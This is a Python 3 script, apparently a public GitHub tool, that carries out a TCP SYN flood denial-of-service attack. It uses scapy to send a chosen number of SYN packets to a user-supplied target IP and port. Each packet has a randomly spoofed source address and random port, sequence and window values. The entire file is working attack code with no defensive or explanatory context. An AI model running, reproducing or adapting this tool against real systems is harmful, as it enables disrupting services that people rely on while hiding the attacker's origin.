#!/usr/bin/python3
# Emre Ovunc
# info@emreovunc.com
# Python3 SYN Flood Tool

from os import system
from sys import stdout
from scapy.all import *
from random import randint

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Packets are sending ...")

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1

	stdout.write("\nTotal packets sent: %i\n" % total)


def info():
	system("clear")
	print ("#####################################")
	print ("#        github.com/EmreOvunc       #")
	print ("#####################################")
	print ("# Welcome to Python3 SYN Flood Tool #")
	print ("#####################################")

	dstIP = input ("\nTarget IP : ")
	dstPort = input ("Target Port : ")

	return dstIP,int(dstPort)


def main():
	dstIP,dstPort = info()
	counter = input ("How many packets do you want to send : ")
	SYN_Flood(dstIP,dstPort,int(counter))

main()
